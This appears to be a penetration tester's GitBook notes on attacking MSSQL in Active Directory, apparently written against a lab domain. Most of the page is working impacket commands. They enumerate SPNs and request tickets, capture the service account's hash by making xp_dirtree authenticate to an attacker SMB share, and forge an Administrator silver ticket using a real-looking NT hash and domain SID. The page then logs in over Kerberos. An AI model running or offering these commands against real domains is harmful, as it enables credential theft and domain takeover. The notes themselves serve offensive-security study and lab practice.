# MSSQL

### **Enumerate MSSQL**

Let's check if there are users with SPNs on the found MSSQL servers

```bash
impacket-GetUserSPNs <DOMAIN MACHINE>/<USER>:<PASSWD>
```

<figure><img src="../.gitbook/assets/Pasted image 20230830104754.png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
IMPACKET-GetUserSPNS -target-domain <DOMAIN> <DOMAIN MACCHINE>/<USER>:<PASSWD>
```
{% endcode %}

<figure><img src="../.gitbook/assets/Pasted image 20230830110943.png" alt=""><figcaption></figcaption></figure>

### **Silver Ticket Attack**

To perform the silver ticket attack against the SQL service we need three things:

1. The NTLM hash of the password of the SqlSvc account. (TGT?)
2. The domain SID.

{% code overflow="wrap" %}
```basH
impacket-getPac -targetUser <USER> <DOMAIN>/<USER>:<PASS>
```
{% endcode %}

3. The SPN that the SqlSvc account is using.

{% code overflow="wrap" %}
```bash
GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -k -dc-ip <DC> -no-pass -request
```
{% endcode %}

We can now proceed to obtain the silver ticket

{% code overflow="wrap" %}
```bash
impacket-ticketer -spn <User>/<Machine> -nthash <sqlsvc NTLM hash> -domain-sid <SID> -domain <Domain> administrator
```
{% endcode %}

<figure><img src="../.gitbook/assets/Pasted image 20230621120729.png" alt=""><figcaption></figcaption></figure>

Import the ticket

```bash
export KRB5CCNAME=administrator.ccache
```

If everything works with klist, you should see this

<figure><img src="../.gitbook/assets/Pasted image 20230621121052.png" alt=""><figcaption></figcaption></figure>

Connect to the machine

```bash
impacket-mssqlclient -k <macchina>
```

### Catch Service account hash

No special privilges. Let's see what user the db is running as by issuing xp\_dirtree while catching the response with impacket-smbserver:

```
mkdir share
impacket-smbserver share share -smb2support

...
exec xp_dirtree '\10.9.1.15share'

...
[*] User NAGOYAsvc_mssql authenticated successfully
...
```

Since the sql server is running in the context of the service user, we can impersonate the administator using silver tickets! You can get the NTHASH of "Service1" using python or online-tools. The Domain SID you can get via `Get-AdDomain`in powershell.

{% code overflow="wrap" %}
```
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator

export KRB5CCNAME=$PWD/Administrator.ccache
klist
...
05/01/2023 17:10:13  04/28/2033 17:10:13  krbtgt/NAGOYA-INDUSTRIES.COM@NAGOYA-INDUSTRIES.COM
```
{% endcode %}

Now we can use the silver ticket to connect via Kerberos.

/etc/krb5user.conf:

```
[libdefaults]
	default_realm = NAGOYA-INDUSTRIES.COM
	kdc_timesync = 1
	ccache_type = 4
	forwardable = true
	proxiable = true
    rdns = false
    dns_canonicalize_hostname = false
	fcc-mit-ticketflags = true

[realms]	
	NAGOYA-INDUSTRIES.COM = {
		kdc = nagoya.nagoya-industries.com
	}

[domain_realm]
	.nagoya-industries.com = NAGOYA-INDUSTRIES.COM
```

/etc/hosts:

```
127.0.0.1       localhost nagoya.nagoya-industries.com NAGOYA-INDUSTRIES.COM
```

Connect:

```
impacket-mssqlclient -k nagoya.nagoya-industries.com
```
